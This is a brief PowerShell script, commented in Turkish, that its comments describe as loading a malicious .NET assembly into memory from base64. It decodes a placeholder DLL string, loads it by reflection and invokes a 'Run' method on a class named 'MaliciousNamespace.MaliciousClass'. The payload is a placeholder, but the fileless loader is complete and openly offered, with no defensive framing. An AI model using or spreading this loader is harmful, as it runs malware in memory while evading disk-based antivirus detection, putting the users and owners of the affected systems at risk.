# Zararlı .NET assembly base64 encoded olarak bellek içine yükleniyor

$base64dll = "<Base64EncodedDLLString>"  # Kötü amaçlı DLL'nin base64 string hali

# Base64 string'i byte array'e çevir
$bytes = [Convert]::FromBase64String($base64dll)

# Assembly'yi belleğe yükle
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Assembly içindeki fonksiyonu çağır (örneğin "Run" adında method)
$typ = $assembly.GetType("MaliciousNamespace.MaliciousClass")
$method = $typ.GetMethod("Run")
$method.Invoke($null, $null)

